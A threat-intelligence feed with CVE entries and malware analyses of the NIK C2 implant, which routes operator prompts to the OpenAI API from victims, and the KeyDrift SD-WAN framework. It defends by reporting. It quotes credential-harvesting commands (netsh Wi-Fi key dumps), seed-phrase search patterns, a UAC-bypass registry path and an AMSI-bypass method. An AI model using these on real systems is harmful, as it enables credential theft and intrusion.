items.title: CVE-2026-41709: Broadcom VMWare ESX Insufficient Logging Vulnerability
items.detail: Broadcom VMWare ESX contains an insufficient logging vulnerability that could allow a malicious actor with admin access to perform certain operations without being logged. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. Catalog addition date is not the attack date.

items.title: CVE-2026-46300: Linux Kernel Missing Initialization of a Variable Vulnerability
items.detail: Linux Kernel contains a missing initialization of a variable vulnerability that could allow for unintended modification of page-cache-backed data via failure to preserve the shared-fragment marker during socket buffer coalescing, causing ESP input processing to decrypt shared fragments in place. This vulnerability can be chained with CVE-2026-109618 and CVE-2026-109619 to implant PHP webshells and run commands as root. items.title: NIK C2: The new AI-enabled command-and-control framework
items.detail: Cisco Talos observed a new AI-integrated command-and-control (C2) framework in the wild called “NIK C2.” NIK C2 contains a Windows implant, using which, an actor can dump credentials, stream the victim's keystrokes to collect the targeted victim’s sensitive data, and instruct an integrated AI model to analyze the harvested data, all within the compromised session. In this framework, the actor has abused the OpenAI Chat Completions application programming interface (API), which is a HTTP endpoint that enables ChatGPT-style conversations programmatically. In addition to the features that enable theft, an actor can also deploy desktop screen-locking ransomware via the NIK C2 implant onto the victim machine, leading to a ransom demand in Bitcoin or USDT cryptocurrencies. NIK C2 reshapes adversary tradecraft by collapsing collection and exploitation into a single continuous session, effectively erasing the offline processing delays that historically granted defenders critical detection windows. Such AI-enabled adversarial frameworks require defenders to move beyond traditional detection and embrace continuous behavioral vigilance as the new baseline. NIK C2 implant: AI-integrated remote access tool The NIK C2 implant is a Go-based, 64-bit Windows remote access tool that grants persistent control over compromised hosts using a resilient dual-channel C2 architecture. It communicates over TLS-secured WebSockets on port 443 alongside an HTTP fallback polling loop every 250 milliseconds, protecting all traffic with AES-256-GCM encryption derived from a hardcoded seed. To survive takedowns, the implant routes traffic across three prioritized C2 tiers, which are runtime-updated URLs, an embedded encrypted server list, and a hardcoded fallback address. Beyond standard operations, the implant features surveillance, theft, lateral movement, and evasion capabilities, including credential dumping, RDP session hijacking, process hollowing, and a C2-driven screen lock ransomware module. Notably, the NIK C2 implant embeds a fully integrated OpenAI API client via its ai_generate command, allowing operators to route arbitrary prompts to the OpenAI Chat Completions API directly through the infected host. The NIK C2 implant manages API key resolution, request assembly, and response parsing locally, returning the encrypted generative AI results to the actor's C2. The observed NIK C2 implant samples in the wild contains an embedded build path (/opt/nik_panel/data/build_52b79724a1fc4b8f/main.go), which identifies the project as "nik_panel" and indicates that the implant was cross compiled for Windows from a Linux development environment. Furthermore, the embedded eight-byte hex token matching the build identifier highlights that the threat actor's infrastructure actively tracking and versioning the implants. Figure 1. NIK C2 implant’s operational architecture. NIK C2 implant evolution timeline Talos observed that the NIK C2 implant development trajectory spans at least three distinct versions. All binaries observed in the wild were compiled with Go 1.23.4 (which was released in December 2024), placing the entire sample set compiled no earlier than late 2024. The actor has Zeroed PE TimeDateStamp fields and near-epoch filesystem timestamps (manifesting as Nov 29, 1979) are applied consistently across all samples. We developed a timeline based on the initial sighting dates of NIK C2 implant variants in OSINT. Figure 2. NIK C2 implant evolution timeline. The pace of capability addition across the three versions indicates a technically proficient team with prior malware operations experience is actively expanding NIK C2 towards a full-service adversarial framework. Active NIK C2 server seen in the wild During our research, we observed that a threat actor hosted the NIK C2 framework on a server at IP address “87.120.196[.]120”, resolving the domain “total-sitevv[.]lol”. The C2 server hosted an SSL/TLS certificate (serial number 7d16381a9de823943b5a0987dbd0f26edf22052b and jarm:"28d28d28d00000000042d42d0000001f361a1bf80ed39a1e352adeb016a07b" ) with the Common Name (CN) set to nik-panel . This CN value matches strings embedded within the implant binary. Observing the NIK C2 infrastructure active in the wild allowed us to assess with moderate confidence that NIK C2 is not merely a proof of concept, but a fully functional, AI-integrated C2 framework. Figure 3. NIK C2 was observed in the wild during the research period. NIK C2 implant integrates OpenAI’s API AI integration is one of the most architecturally distinct features of NIK C2 implant. It constructs a fully formed HTTP request to OpenAI’s production inference endpoint, transmits it from the victim machine IP address, parses the JSON response, and returns the AI-generated text to the actor’s panel. The entire operation from receiving the actor prompt to returning the large language model (LLM) reply is executed synchronously with a 60-second timeout. The implant begins by extracting three fields from the command payload received from the C2. The first field, identified by the key prompt , is the text the actor wants to send to the AI model. If the prompt string has zero length, the handler immediately constructs an error response and returns without making any outbound network call. The second field, identified by the key api_key is the OpenAI API key to use for authentication. The third field, identified by the key model , specifies which OpenAI model to use. Figure 4. Snippet of NIK C2 implant AI handler module. After extracting the three parameters, the implant checks whether the actor supplied an API key. If not, it calls the operating system's environment variable reader with the string OPENAI_API_KEY and uses the victim’s API key. This fallback is not a backup mechanism for API key resolution. It is a deliberate design with significant operational implications. If the victim has configured an OpenAI account on their machine, that account's API key will be used to fund the actor's AI inference. OpenAI's billing system will charge the victim's payment method, and OpenAI's access logs will show the victim's API key as the one that made the requests, allowing no trace attributable to the threat actor. If the actor does not specify a model name, the implant falls back to a five-character default string stored in the binary data section. Decoding the five-character value showed gpt-4 confirming that GPT4 is the default when no model is specified. The actor can override this by passing any valid OpenAI model identifier in the command payload, allowing selection of newer models as they become available without requiring a binary update. The implant builds the OpenAI API request body by constructing a map with four fields. The first field uses the key model and contains the resolved model name. The second field uses key messages and contains a two-element array of message maps. The third field uses the key temperature and contains a floating-point value read from a constant in the binary data section. The fourth field uses the key max_tokens and contains an integer value also read from binary. The message array is constructed in the order that the OpenAI Chat Completions API expects. The system message is first followed by the user message. The system message map has the role system and a content string that is exactly 68 bytes long hardcoded in the binary. This 68-byte string is the implant's behavioral instruction to the AI. It defines the model's operational role and response style for the duration of the session. The user message map has the role user and contains the actor's prompt text verbiage. The complete map structure is then serialized to JSON. The JSON message is sent to the URL https:// api.openai.com/v1/chat/completions , the OpenAI Chat Completions endpoint, through an HTTP POST request. Figure 5. Snippet of NIK C2 implant AI handler module. When the HTTP response arrives with a 200 status code, the handler uses Golang's JSON decoder to parse the response body directly into a generic map structure without defining a typed schema. It then navigates the decoded map by string key lookups in the sequence that the OpenAI Chat Completions API response structure defines. The outermost map is queried for the key choices which in a successful response contains an array. The implant checks that this array is non-empty, then accesses its element keys message and content . The string value at key content is the AI model-generated text response. After successfully extracting the AI-generated content, the handler assembles a result map with four entries. The key status is set to a constant string that reads as generated . The key code is set to the AI model's response text, so that the actor receives the full content of the model’s replies. The key model is set to the resolved model name that was used for the request, confirming which model produced the output. The key usage is set to the raw usage object from the OpenAI response, which contains the prompt token count, completion token count, and total token count. This usage data allows the actor to track how many tokens are consumed per request. The completed result map is ultimately transmitted to the C2 server over WebSocket or through the HTTP fallback C2 address. Figure 6. AI model response is encapsulated in JSON message and will be sent to C2. Dual execution modes of NIK C2 implant Upon execution, the implant inspects its command-line arguments to determine its execution path. The argument watchdog activates supervisory monitoring to relaunch the core process if terminated, the copywatchdog tracks file copy operations, and the absence of either defaults execution to primary agent mode. In primary mode, it uses a named mutex to enforce single-instance execution, logs a message reading [NIK] Starting , generates a 32-byte cryptographic session key if uninitialized, decodes its obfuscated C2 address, and sets its masquerade name to “svchost.exe” or “simvol.exe”. After initial setup, the binary records its process ID (PID) in the victim's temporary application folder and executes its persistence and evasion routines. These routines include copying to %appdata%/Roaming/Microsoft/Network with modified access controls, configuring Windows autostart registry entries, and masquerading its process. Finally, it starts the local proxy server, initiates the WebSocket communication loop in a separate goroutine, and enters a continuous heartbeat polling loop on the main thread. Implant’s C2 command surface overview The implant command dispatcher module facilitates over 52 commands that are directed by the C2 panel. The dispatcher module uses byte-level string matching to map the associated modules that are launched as concurrent goroutines, allowing multiple operations to run in parallel. The following table shows the NIK C2 implant’s command categories: Category Capability Description Stealer Credential Stealer Browser databases, saved passwords, cookies, autofill, crypto wallets, Discord tokens , Firefox profiles . Stealer Wi-Fi harvesting Extracts all saved WiFi SSIDs and plaintext passwords via Windows wireless configuration tooling . Surveillance Keylogger Real-time live stream per keystroke to actor panel, plus accumulated buffer dump on demand . Surveillance Screen Capture Full-screen screenshot and continuous screen stream . Surveillance Camera & Audio Camera snapshot and stream, microphone recording, live audio feed . Surveillance Clipboard Monitor Real-time clipboard content interception and replacement . Remote Control HVNC Hidden Virtual Network Computing — full desktop control invisible to the victim . Lateral Movement SOCKS5/HTTP Proxy Embedded proxy routing actor traffic through victim into internal network . Lateral Movement Reverse Proxy Tunnel Bidirectional TCP relay tunneled over C2 WebSocket for LAN pivoting . Lateral Movement RDP Operations RDP session interaction for lateral movement to other Windows hosts . Persistence Autostart & Masquerade Registry Run key persistence, process name masquerading, COM hijacking . Persistence Self-Heal Watchdog External watchdog subprocess monitors and relaunches agent on termination . Evasion Defense Bypass AMSI patch, debugger detection, stealth mode, UAC bypass, process hollowing . AI AI Generate Live OpenAI API inference routed through victim machine with actor prompts . Destructive Boot Ransomware Master Boot Record raw backup via PowerShell disk read and Screen- locking ransomware via LOLbin , registry persistence, crypto payment demand . Destructive Bootkit Preparation UEFI vs. BIOS detection, Secure Boot query, bootkit binary staging . Implant deploys screen-locking ransomware The ransomware module of the implant operates as a multi-stage attack controller that the actor runs in sequence to prepare, deploy, and retract a screen-locking ransomware payload. At first, it executes PowerShell to execute a raw disk copy command that reads directly from the physical drive device path (“\\.\PhysicalDrive0”) and writes the first sector, which is Master Boot Record (MBR), to a file named “mbr_backup.bin” in the Windows temporary directory. Figure 7. Snippet of NIK C2 implant’s boot ransomware handler function. Next, the module constructs a complete self-contained HTML lock screen code entirely at runtime from a hardcoded format string, parameterized with actor supplied Bitcoin and USDT wallet addresses, prices, contact email, timer duration, and custom text from the C2 command message, allowing the actor to fully customize the ransom demands. Figure 8. Screenlocker HTML code is hardcoded in NIK C2 implant binary. After generating the HTML code, the binary writes it to the file “lock_screen.html” in the system temporary directory. It then generates a Windows batch script that calls mshta.exe with the path to the HTML file, followed by an infinite loop construct with a five-second timeout between iterations, ensuring that if the user somehow closes the window it reopens within five seconds. This batch file is written to the temp directory as “lock_start.bat”. The implant then runs a reg add command that writes a registry Run key named “SystemLock” under the current user's autostart path, pointing to a cmd /c invocation of the batch file, so the lock screen is executed on every user's logon. Additionally, a background goroutine is spawned that continuously monitors and relaunches the lock screen process. Finally, the module sends a confirmation response to C2 with the path of the deployed HTML file and the timer value. The design of this ransomware module is notable for several reasons. It does not encrypt any files, which means it leaves no forensic trail of file modification timestamps or encryption markers. It relies entirely on a screen lock, which is considerably faster to deploy than a file encryption ransomware. The persistence via registry Run key and a self-healing loop ensures the screen lock survives user attempts to dismiss it and survives a system restart. Figure 9. Desktop lockscreen page of the ransomware deployed by the NIK C2 implant. Implant’s bootkit preparation feature The bootkit preparation module of the implant is designed to survey the victim machine's boot firmware environment and then stage a bootkit payload file. It executes bcdedit /enum , the Windows Boot Configuration Data editor, with the output flag that enumerates all boot entries while hiding the console window. The implant reads the full output and searches for three specific substrings in sequence including EFI , Windows Boot Manager , and Windows Legacy OS Loader . If any of these are found, the boot type is classified as UEFI. The binary also searches for ntldr , the legacy Windows NT loader used by BIOS-mode systems as a fallback. Based on which string was matched, the boot type is recorded as either "UEFI" or "BIOS" as a string of the appropriate length. Separately, the binary runs a PowerShell command invoking Confirm-SecureBootUEFI , which is a built-in PowerShell command that returns to the current Secure Boot state. The output is searched for the string True to detect an enabled Secure Boot and for False to detect an explicitly disabled Secure Boot. If neither is present, the value is recorded as unknown . The result is sent back to the C2, a map containing the boot type classification and the Secure Boot status string. Then the implant writes a 16-byte placeholder file named “bootkit.bin” to the system temporary directory. The bytes written spell out "NIK_BOOTKIT_PREP" in ASCII, which serves as a staging marker rather than an actual bootkit binary. This placeholder confirms that the target path is writable by the current process, establishes the file location that subsequent operations will reference, and can be overwritten by the actual bootkit binary delivered through the implant's file-upload or file-write command handlers. The path to the staged file is returned to the C2 in response. Implant’s theft functionality When the actor issues the theft category commands from the C2, the implant executes the associated goroutines to collect the targeted data into a result map space in the victim machine memory: WiFi password theft (wifi_steal) The implant executes netsh commands directly via Go’s exec.Command function by passing arguments as discrete tokens rather than through a shell string. Harvested results are formatted under specific labels: plaintext Wi-Fi passwords appear under Key Content: , saved network names are cataloged under WiFi Profiles: (with missing entries flagged using the per-entry format [%s] not found ), and execution failures or absent interfaces return standardized error strings such as [WiFi] no wireless adapter or access denied and No WiFi profiles found . netsh wlan show profiles netsh wlan show profile name=" " key=clear Browser credential extraction (passwords, quick_steal) The implant stages targeted browser database files into an archive alongside the Local State file, which contains the AES master key protected by Data Protection Application Programming Interface (DPAPI). The implant imports and executes the CryptUnprotectData Windows API to unwrap the AES key and decrypt the databases locally. Otherwise, it exfiltrates the raw encrypted databases to the C2 server for offline extraction. Targeted browser database files are shown in the table: Browsers Targeted files Chrome Login Data, Cookies, Web Data, Local State, Bookmarks Edge Login Data, Cookies, Web Data, Local State Brave Login Data, Cookies, l eveldb file Opera Login Data from folder Opera Software\Opera Stable\ Firefox key4.db, logins.json , places.sqlite , formhistory.sqlite , Secure Preferences Token and cookie theft (token_grab, quick_steal) The implant extracts Discord tokens and session cookies from the levelDB store on the victim machine. The extracted outputs are labelled as === Discord Tokens === and DISCORD TOKENS . The browser session cookies (Discord_Cookies) are extracted from the copied Cookies database. Cryptocurrency wallet theft (crypto_steal, wallet_export) Victim’s desktop-based wallets are collected directly from the wallet storage paths. Browser extension wallets are extracted from chromium LevelDB stored by extension ID. Desktop based wallet storage paths targeted are listed below: /AppData/Roaming/Exodus/exodus.wallet /AppData/Roaming/Electrum/wallets /AppData/Local/Electrum/data/wallets /AppData/Roaming/Ethereum/keystore /AppData/Local/LedgerLive wallet.dat (Bitcoin Core) /AppData/Roaming/atomic (Atomic Wallet) Electrum\wallets Browser extension wallets targeted: Wallet Extension ID MetaMask (Chrome/Brave) nkbihfbeogaeaoehlefnkodbefgpgknn MetaMask (Edge) nkbihfbeogaeaoehlefnkodbefgpgknn Coinbase Wallet hnbohgpbmfldddohgoiefkeifpjficbk Phantom (Chrome) lnbcamaoebkogjmdnaofbeemigaalhlp Brave Wallet odbfpeeihodbihlmhbnhakoadhilfibh Seed phrase, private key file, and system reconnaissance The implant performs two regular expression patterns to search on the entire filesystem of the victim machine. These two regular expressions are designed to scan file names for sensitive cryptographic assets and credentials, functioning as case-insensitive patterns ?i . The first expression targets cryptocurrency recovery materials and wallet backups by matching keywords like "seed," "mnemonic," or "wallet" paired with common plain-text and data file extensions (.txt, .md, .csv, .dat), while the second seeks out asymmetric private keys and general secrets using terms like "private," "privkey," or "secret" paired with both text files and standard cryptographic key containers (.key, .pem). Because both patterns use unanchored, greedy matching (.*) without start (^) or end ($) boundary anchors, they capture any file where these sensitive terms precede the target extensions. Matched data are collected under the label of seed candidates and archived into “browserdata.zip”. (?i)(seed|phrase|mnemonic|recovery|backup|wallet).*(\.txt|\.md|\.csv|\.dat) (?i)(private|privkey|secret).*(\.txt|\.md|\.key|\.pem) The implant also performs victim machine reconnaissance by executing the following commands and uses chcp 65001 prefix to force the output in UTF-8 format. chcp 65001 >nul 2>&1 & systeminfo chcp 65001 >nul 2>&1 & wmic os get lastbootuptime /value chcp 65001 >nul 2>&1 & wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName 2>nul chcp 65001 >nul 2>&1 & Get-Process | Select-Object Id, ProcessName | ConvertTo-Json -Compress After all collection paths are complete, the implant assembles all collected data into a single document that looks like a formatted report with clearly labeled sections for each data category such as === CRYPTO === , === WIFI === , === BROWSER === . Keylogger: Keystrokes livestreamed to C2 The keylogger module of the implant uses a persistent background goroutine that polls all 256 Windows virtual key codes, detecting keypresses via dynamically resolved API calls, and transmits the captured input. When a compromised victim presses a valid key on the keyboard, it is simultaneously streamed live as an AES-256-GCM encrypted JSON payload over WebSocket to C2 and also appends to an in-memory buffer capped at 10,000 entries and halved when full to prevent memory leaks. On an actor's dump command, this buffer is concatenated into a single string and returned to C2 via WebSocket or HTTP fallback, ensuring complete data transfer even during network interruptions. Stolen data exfiltration to C2 Once the archive is assembled, the entire result map is handed to the result transmission routine of the implant. That routine constructs a new JSON object containing five specific fields. It includes the command identifier echoed back from the original command. It also contains the agent's persistent identifier, formatted as ag_<16 hex chars> . The type field is set to the string quick_steal_response . Finally, the data field holds the complete result map. Once constructed, this object is forwarded to the encryption routine. The routine serializes the object into JSON. It then generates 12 fresh random bytes to serve as a nonce. Next, it encrypts the serialized JSON using AES-256-GCM with a static key derived from a hardcoded seed. It concatenates the nonce, the ciphertext, and the 16-byte authentication tag and Base64-encodes the entire payload. The encrypted payload is placed in a wrapper object under the "e" key alongside the plain-text agent ID, and the wrapper is JSON marshaled into the final payload. This encrypted payload is then delivered through an available transmission path. The sending routine first checks whether the WebSocket connection is live. If it is, the payload is written directly into a WebSocket text frame on the existing connection, reaching the actor's panel with minimal latency. If the WebSocket is not currently connected, the routine falls back to an HTTP POST request to the endpoint path /api/c2/result on the C2 server, using the same encrypted body format. This dual-path design ensures stolen data is delivered even during WebSocket interruptions, as the HTTP channel remains functional independently of the WebSocket state. Implant’s C2 protocol The implant C2 architecture is designed for two independent, simultaneously operating communication channels. The primary channel is a persistent WebSocket connection over TLS. The secondary channel is an HTTP polling loop that posts to a fixed API endpoint at regular intervals. With the primary channel, the connection begins with a TCP dial to the C2 server address with an eight-second timeout. If the port is not explicitly present in the configured address, port 443 is appended automatically. Once the TCP socket is established, it is wrapped in a TLS session using a custom certificate configuration that pins to a specific certificate rather than validating against the system's certificate authority store. This prevents standard TLS interception proxies from observing traffic. Immediately after a successful WebSocket handshake but before any command is received, the implant transmits a full system registration message. The implant collects victim data such as the machine hostname, the local LAN IP address, the Windows username from the environment, a user security identifier, the local reverse-proxy port number that was assigned when the embedded proxy server was started, and the detected upstream proxy configuration derived from the Windows registry proxy settings. All of this is assembled into a JSON object and encrypted and sent to the C2. Figure 10. Snippet of NIK C2 IMPLANT’s C2 communication handler function. The HTTP polling channel runs independently. Every approximately 250 milliseconds, the agent collects a fresh snapshot of victim state hostname, watchdog status, local IP, username, current timestamp, and system uptime encrypts it in the same wire format and posts it to the /api/c2/update endpoint on the C2 server. Below table shows the C2 endpoints that the implant communicates: Endpoint Purpose / api /c2/update Reconnaissance beacon – victim system info / api /c2/result Command output exfiltration / api /c2/screen Screenshot upload / api /c2/ file_chunk File exfiltration / api /c2/ rproxy _up Reverse proxy upstream data / api /c2/ ws Websocket – a ctor command channel Every message on both channels, in both directions, uses the same symmetric encryption scheme. A hardcoded seed value stored in obfuscated form in the binary data section is decoded at startup and produces a 32-byte AES key. Decoded AES seed: d791dd0ff3228ed29a8d7333d4567be829159c5632ea347780992006f91c5295 32-byte AES key: 4887AFC0A574E9419A9695EF083460F58E4EF9A1C40793523CE112251273BDF9 The C2 server then responds with an encrypted payload, whose inner map contains a command array identical in structure to those delivered over WebSocket. Commands received through HTTP are dispatched through the same logic. If the HTTP POST fails, the agent rotates to the next server address before retrying. Figure 11. Snippet of NIK C2 implant’s C2 communication handler function. The result transmission to the C2 is performed by the implant when a command handler completes its operation, the result is packaged into a response envelope containing the original command's identifier, the implant's own identifier, a type string formed by appending _response to the command name, the result data payload, and a top-level type marker of "result". This object is encrypted and delivered through either directly over the WebSocket connection if it is active, or via an HTTP POST to /api/c2/result . Implant’s defense evasion and anti-analysis techniques The NIK C2 implant deploys a layered set of defense evasion measures that activate immediately at startup and operate across the full compromise session. On launch, It hides its console window via API ShowWindow , renames the binary to “csrss.exe” in the Windows temp directory to impersonate a legitimate system process, disables Windows Recent Documents telemetry through a registry write action, and applies a critical-process flag via API NtSetInformationProcess with the parameter value 0x1D for ProcessBreakOnTermination that causes a Blue Screen of Death if any attempt is made to terminate the process through Task Manager or taskkill actions. Figure 12. Snippet of NIK C2 implant’s evasion handler module. Alongside these, two anti-debug checks IsDebuggerPresent and CheckRemoteDebuggerPresent run silently and call os.Exit(0) on detection, leaving no exception record or crash evidence. When directed by the C2, the implant can also escalate privileges without a UAC prompt using the fodhelper.exe COM hijack , which writes the implant path into HKCU\Software\Classes\ms-settings\Shell\Open\command , triggers elevation, and cleans the registry key within two seconds. The implant bypasses the Antimalware Scan Interface (AMSI) by executing a hardcoded, embedded PowerShell script that patches memory inside “System.Management.Automation.dll”. Specifically, it overwrites the AmsiInitFailed field with a six-byte stub (MOV EAX, E_INVALIDARG; RET) , forcing initialization to report failure and disabling content inspection for the remaining of the PowerShell session. Figure 13. NIK C2 Implant’s AMSI bypass PowerShell script. Conclusion The emergence of NIK C2, an AI-enabled command-and-control framework, underscores a critical shift in modern malware design: the transition from static intrusion toolsets to dynamic, modular implants that adapt on demand. By embedding a live AI pipeline directly into the C2 loop, the compromised host is no longer a passive foothold but an autonomous operational asset. Operators can dynamically generate context-aware lure material, execute localized deception, synthesize operational intelligence, and craft targeted payloads directly on the compromised hosts — all while lowering the technical barrier which was traditionally required for such sophisticated tradecraft. Coverage The following ClamAV signature detects and blocks this threat: Win.Trojan.GoDiscorder-10060526-0 Indicators of compromise (IOCs) IOCs for this research can be found at our GitHub repository here .

items.title: Inside KeyDrift: Analyzing historical UAT-11473 activity on Cisco SD-WAN
items.detail: Cisco Talos has identified UAT-11473, a highly sophisticated advanced persistent threat (APT) actor, who exploited CVE-2026-20127 , an authentication bypass vulnerability in Cisco SD-WAN Catalyst Controller instances to bypass authentication and gain unauthorized access to affected systems. UAT-11473 then installed a custom malware framework we track as “KeyDrift” consisting of multiple components geared towards collecting sensitive keying information, acting as backdoors and intermediate command-and-control (C2) hosts. Observed targeting spans across space and satellite services, defense and aerospace technology, and policy research. Talos assesses with high confidence that UAT-11473’s operating infrastructure overlaps considerably with Volt Typhoon’s “Silent Train” covert access network . KeyDrift is a custom malware framework that is designed to operate in Cisco SD-WAN controller environments. Talos assesses with high confidence that the framework is designed to provide long-term persistent access and automated exfiltration of sensitive keying material. KeyDrift operates inside SD-WAN control-plane processes and is capable of intercepting decrypted control traffic, extracting control-session metadata and data-plane keying material, and staging or transmitting the collected material using encrypted records. The framework's primary component is PolyFlame, a memory-resident module deployed through modified runit service paths. PolyFlame is injected into legitimate running vdaemon processes, and it can also masquerade as a packed “aaamgrd” loader variant. Once resident, PolyFlame interposes socket, DTLS, and runtime-linker behavior through functions such as recvfrom, sendto, getpeername, dlopen, dlsym, mprotect, and “/proc/%d/maps” parsing. This gives KeyDrift access to SD-WAN control-plane traffic from inside legitimate controller daemon execution rather than through a conventional endpoint beacon. LittleFilch, another component of the KeyDrift framework, provides the collection and exfiltration capability identified in the framework. The module hooks “SSL_read” inside vdaemon, inspects decrypted control-plane buffers, extracts keying material for a list of predefined edge nodes, and stages the data locally in encrypted format for exfiltration. Talos assesses with high confidence that KeyDrift's intended operational purpose is Cisco SD-WAN control-plane collection: persistent controller residence, in-band traffic access, key-material extraction from decrypted control messages, and encrypted staging or exfiltration of the recovered material. Observed variations of the KeyDrift modules and deployment mechanisms suggest active development of the framework’s capabilities. KeyDrift analysis KeyDrift uses Cisco SD-WAN runit service paths as its primary execution anchor. In the PolyFlame sshd deployment, the actor modifies the service run script, remounts /rootfs.rw executable, launches a malicious script “conf_sshd” in the background, and then starts the legitimate sshd service. The loader script enumerates running vdaemon PIDs, records them in “/tmp/system-vdaemon”, and invokes the injector component “rsshd” to inject PolyFlame (“libdssl.so”) into each process. Recovered conf_sshd logic uses the same control flow across reviewed samples: Figure 1. conf_sshd control flow logic. Runit launchers The observed sshd runit launcher preserves normal Cisco SD-WAN sshd startup logic while adding two malicious lines before service execution, which remount “/rootfs.rw” executable and background execution of conf_sshd, which then drives rsshd injection into vdaemon. Figure 2. conf_sshd execution logic. The recovered aaamgr runit launcher from an affected vBond appliance uses a parallel service-wrapper pattern, but it executes the packed aaamgrd PolyFlame loader directly. The deletion of the writable-overlay PAM configurations for sshd and login before remounting “/rootfs.rw” executable if part of the legitimate script, along with the invocation of the aaamgrd daemon via Python: Figure 3. aamgrd daemon launch. PolyFlame PolyFlame is the primary operational module in the KeyDrift framework. PolyFlame operates at the socket and DTLS control-plane layer. PolyFlame serves two primary purposes: Command execution via a TinyShell-styled backdoor Intermediate C2 that can forward commands to and from the C2 to other peers PolyFlame is primarily injected into the vdaemon process, providing operational obfuscation and access to all in-process state: DTLS session keys, vEdge topology, OMP routes, and policy tables. No hardcoded IPv4 addresses, binding ports, callback domains, URLs, host headers, or polling interval were recovered from the analyzed PolyFlame samples. PolyFlame is designed for in-band control or tasking over Cisco SD-WAN control-plane traffic rather than a conventional fixed external beacon. This implant is meant to serve as a hook of the recvfrom() API call. The original recvfrom is replaced by a malicious subroutine in the vdaemon process. When recvfrom is called in the vdaemon process, the malicious subroutine will first execute the real/legitimate recvfrom() API to obtain the C2 IP address info for communicating with it in the future. PolyFlame’s time check The recvd data from the C2 consists of the MD5 value of a specific DATE. PolyFlame will calculate the local time on the device in format “%Y-%m-%d" and calculate its MD5 hash. If the MD5 calculated by the device does not match with the one sent by the C2, the implant will stop further execution. Otherwise, the implant then uses an “administrative code” from the C2 and performs an action. PolyFlame’s tasking PolyFlame contains an administrative mode that processes the admin code sent by the C2, that defines operations — it's one of the first flags checked in the backdoor: Code = 1: Generate random bytes and send to C2. This is likely a check-in beacon or heartbeat for the C2. Code = 2: Set implant type to backdoor (TinyShell) or intermediate C2. Code = 3: Set up the command handler for the intermediate C2. Any other code value: Check the implant type flag currently set. Based on the implant type flag, either send the accompanying data to TinyShell or the intermediate C2 component for processing. PolyFlame’s command execution PolyFlame contains a backdoor that matches the capabilities of TinyShell: file read, file write, and arbitrary command execution, but not interactive shell. This backdoor component’s implementation is quite similar to TinyShell, but the command codes differ. PolyFlame handles the following command codes: Code = 0x100: Execute command using “/bin/sh -c <command>” Code = 0x200: Write file to disk. Code = 0x300: Read file from disk and send to the C2. PolyFlame as an intermediate C2 component The intermediate C2 component is a one-to-many handler (somewhat like a one-to-many multiplexer) — meaning the implant can connect to only one C2 but can connect to many peers who can be served by the intermediate C2 component. Similar to the TinyShell-backdoor component, the intermediate C2 component also accepts and processes specific command codes from the C2: Code = 0x403: Create a thread to connect to the specified peer IP. Make a new connection and keep socket alive until specified. Code = 0x404: Send data recvd from the C2 to a connected peer. Code = 0x405: Remove a peer from the list of active connections. Code = 0x407: Send a response recvd from a peer, back to the C2. Code = 0x408: Set a specific value in memory. PolyFlame variant: aaamgrd Talos has observed a distinct PolyFlame variant that masquerades as the aaamgr service. The legitimate Cisco aaamgr component is a Python package; it does not normally appear as a compiled ELF runit service. This PolyFlame variant is executed by a malicious runit service under “/etc/sv/aaamgr/” with aaamgrd and a modified run launcher. aaamgrd is a statically linked ELF64 executable with no section headers, a single RWE loader segment, and an RC4-encrypted embedded ELF payload. The loader uses direct syscalls including ptrace, fork, wait4, kill, tgkill, mmap, and mprotect. It performs an anti-debug check by deobfuscating /proc/%d/status and TracerPid: and exits if a tracer is present. The observed staging sequence was: Figure 4. PolyFlame staging sequence. Note that in addition to the implant execution staging, there are also indications of timestomping. LittleFilch: libcommon.so TLS interception module LittleFilch is a control-session interception module positioned to collect data-plane keying material from control sessions visible to the injected vSmart process. LittleFilch installs an SSL_read hook inside vdaemon. The hook calls the original SSL_read, then processes returned buffers only when the returned size is greater than 0x18F, the first decrypted byte is 0x07, and three marker patterns are checked for presence. These marker bytes are followed by the actual artifacts that LittleFilch aims to record: Marker bytes Parsed field Length Notes 40 03 06 Public IP 4 bytes vEdge public / transport IP 40 0C 04 Peer system-IP 4 bytes vEdge OMP system-IP 05 01 0C 06 40 Binary key field 32 (0x20) bytes Assessed OMP-distributed AES-256 IPsec data-plane key material LittleFilch records the extracted keying material and RSA-encrypts it before writing the output to “/var/tmp/vdaemon.bin”. It can then send the encrypted content over UDP in a DTLS 1.2 application-data style record. Figure 5. Keying material recording format used by LittleFilch. LittleFilch expects its configuration file — located at “/var/tmp/vdaemon.conf” — to contain two host port lines: one local bind IP/port and one remote destination IP/port. It deletes “/var/tmp/vdaemon.conf” after reading it. Talos has not been able to recover the “vdaemon.conf” file. KeyDrift components Component Primary hook/surface Observed scope Confirmed function PolyFlame libdssl.so Socket / DTLS / runtime linker interposition inside vdaemon Multiple affected controller roles In-band control-plane interception and tasking; exact command format unresolved rsshd Ptrace injection Multiple affected controller roles Injects libdssl.so into vdaemon by PID conf_sshd Shell-based PID enumeration Multiple affected controller roles Locates vdaemon PIDs and records injection output Trojanized run Runit service launcher Multiple affected controller roles Remounts overlay executable and launches injector chain Packed aaamgrd Packed loader, direct syscalls, anti-debug Affected vBond appliance evidence Decrypts and runs embedded PolyFlame payload; tampers with PAM configs LittleFilch libcommon.so OpenSSL SSL_read hook Affected vSmart process evidence Extracts control-session identifiers and assessed data-plane key material from decrypted control traffic vdaemon.bin Encrypted staging file Affected vSmart process evidence Stores RSA-encrypted LittleFilch telemetry records vdaemon.conf Runtime endpoint config Affected vSmart process evidence Supplies local and remote UDP endpoint configuration; deleted after read MITRE ATT&CK techniques Technique ID Notes Process Injection: Ptrace System Calls T1055.008 rsshd injects libdssl.so into vdaemon by PID Hijack Execution Flow: Dynamic Linker Hijacking T1574.006 PolyFlame uses dlsym(RTLD_NEXT, ...), dlopen, and runtime interposition Boot or Logon Initialization Scripts T1037 Modified runit service scripts launch KeyDrift components Create or Modify System Process T1543 Malicious service paths under etc/sv/sshd/ and etc/sv/aaamgr/ Masquerade Task or Service T1036.004 sshd and aaamgr service-name masquerading Unix Shell T1059.004 conf_sshd and recovered operator staging commands Software Packing T1027.002 aaamgrd uses packed embedded ELF payload System Checks T1497.001 aaamgrd checks TracerPid before unpacking Timestomp T1070.006 touch --reference= and chmod --reference= staging commands copied 